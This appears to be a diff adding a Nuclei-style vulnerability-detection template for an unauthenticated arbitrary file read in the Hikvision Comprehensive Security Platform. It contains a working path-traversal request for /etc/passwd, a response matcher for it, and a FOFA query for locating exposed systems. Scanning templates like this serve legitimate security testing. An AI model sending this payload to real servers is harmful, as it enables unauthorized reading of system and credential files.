@@ -1,0 +1,27 @@
+http:
+- matchers:
+  - part: body
+    regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd'
+id: hikvision-orgs-download-lfi
+info:
+  author: Co5mos
+  description: "\u6D77\u5EB7\u5A01\u89C6\u7EFC\u5408\u5B89\u9632\u7BA1\u7406\u5E73\
+    \u53F0 /orgManage/v1/orgs/download \u63A5\u53E3\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\
+    \u8BFB\u53D6\u6F0F\u6D1E\u3002\u672A\u7ECF\u8FC7\u8EAB\u4EFD\u8BA4\u8BC1\u7684\
+    \u8FDC\u7A0B\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u6B64\u6F0F\u6D1E\u8BFB\u53D6\
+    \u670D\u52A1\u5668\u4E0A\u7684\u4EFB\u610F\u6587\u4EF6\uFF0C\u53EF\u80FD\u5BFC\
+    \u81F4\u654F\u611F\u4FE1\u606F\u6CC4\u9732\u3002\n"
+  metadata:
+    fofa-query: "title=\"\u7EFC\u5408\u5B89\u9632\u7BA1\u7406\u5E73\u53F0\""
+  name: Hikvision Comprehensive Security Platform Arbitrary File Read
+  severity: critical
+  tags: hikvision,lfi
